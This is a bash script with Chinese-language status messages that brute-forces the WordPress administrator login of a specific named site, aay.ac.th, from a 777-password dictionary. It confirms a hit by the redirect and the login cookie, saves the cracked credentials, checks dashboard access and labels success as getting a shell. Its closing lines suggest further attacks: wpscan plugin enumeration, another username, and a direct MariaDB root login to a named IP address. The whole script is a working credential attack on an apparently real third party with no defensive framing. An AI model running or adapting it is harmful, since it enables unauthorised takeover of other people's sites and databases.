#!/bin/bash
TARGET="https://aay.ac.th"
USER="admin"
DICT="smart_passwords.txt"
TOTAL=$(wc -l < $DICT)

echo "╔════════════════════════════════════════════════════════╗"
echo "║     快速精确爆破 - 777个智能密码                     ║"
echo "╚════════════════════════════════════════════════════════╝"
echo
echo "[+] 目标: $TARGET"
echo "[+] 用户: $USER"
echo "[+] 字典: $DICT ($TOTAL 个)"
echo "[+] 方法: curl 4重验证（302+Location+Cookie+ErrorCheck）"
echo "[+] 速率: ~60个/分钟（1秒间隔）"
echo "[+] 预计时间: ~13分钟"
echo "[+] 开始: $(date '+%H:%M:%S')"
echo
echo "═══════════════════════════════════════════════════════"

count=0
start_time=$(date +%s)

test_password() {
    local pass="$1"
    local num="$2"
    
    # 获取初始cookie
    curl -sk "$TARGET/wp-login.php" -c /tmp/wp_${num}.txt -o /dev/null 2>&1
    
    # 提交登录
    local code=$(curl -sk "$TARGET/wp-login.php" \
        -X POST \
        -b /tmp/wp_${num}.txt \
        -c /tmp/wp_res_${num}.txt \
        -d "log=$USER&pwd=$pass&wp-submit=Log+In&testcookie=1" \
        -D /tmp/wp_hdr_${num}.txt \
        -o /tmp/wp_body_${num}.html \
        -w "%{http_code}" \
        2>&1)
    
    # 4重验证
    if [ "$code" = "302" ]; then
        if grep -qi "Location:.*wp-admin" /tmp/wp_hdr_${num}.txt 2>/dev/null; then
            if grep -qi "wordpress_logged_in" /tmp/wp_res_${num}.txt 2>/dev/null; then
                if ! grep -qi "login_error" /tmp/wp_body_${num}.html 2>/dev/null; then
                    echo
                    echo "╔════════════════════════════════════════════════════════╗"
                    echo "║           🎯 GetShell 成功！                          ║"
                    echo "╚════════════════════════════════════════════════════════╝"
                    echo
                    echo "用户名: $USER"
                    echo "密码: $pass"
                    echo "测试序号: $num/$TOTAL"
                    echo "登录URL: $TARGET/wp-login.php"
                    echo "后台URL: $TARGET/wp-admin/"
                    echo
                    echo "[+] Cookie已保存: /tmp/wp_res_${num}.txt"
                    echo "[+] 验证后台访问:"
                    curl -sk "$TARGET/wp-admin/" -b /tmp/wp_res_${num}.txt | grep -qi "dashboard" && echo "    ✅ Dashboard可访问"
                    echo
                    # 保存成功凭证
                    echo "$USER:$pass" > SUCCESS.txt
                    exit 0
                fi
            fi
        fi
    fi
    
    # 清理临时文件
    rm -f /tmp/wp_${num}.txt /tmp/wp_res_${num}.txt /tmp/wp_hdr_${num}.txt /tmp/wp_body_${num}.html 2>/dev/null
}

while IFS= read -r pass; do
    count=$((count + 1))
    
    # 显示进度（每10个）
    if [ $((count % 10)) -eq 0 ]; then
        elapsed=$(($(date +%s) - start_time))
        speed=$((count * 60 / elapsed))
        percent=$((count * 100 / TOTAL))
        remaining=$(( (TOTAL - count) * elapsed / count ))
        echo "[进度] $count/$TOTAL ($percent%) | 速度: ${speed}/min | 剩余: $((remaining/60))分$((remaining%60))秒 | 当前: $pass"
    fi
    
    test_password "$pass" "$count"
    
    sleep 0.8
    
done < "$DICT"

echo
echo "═══════════════════════════════════════════════════════"
echo
total_time=$(($(date +%s) - start_time))
echo "❌ 测试完成，未找到有效密码"
echo "测试总数: $count 个"
echo "总用时: $((total_time/60))分$((total_time%60))秒"
echo "平均速度: $((count * 60 / total_time)) 个/分钟"
echo
echo "建议下一步:"
echo "1. wpscan扫描插件漏洞: wpscan --url $TARGET --enumerate p,t"
echo "2. 测试其他用户名: aay-editor"
echo "3. 从VPS测试MariaDB直连: mysql -h 203.170.190.241 -u root -p"
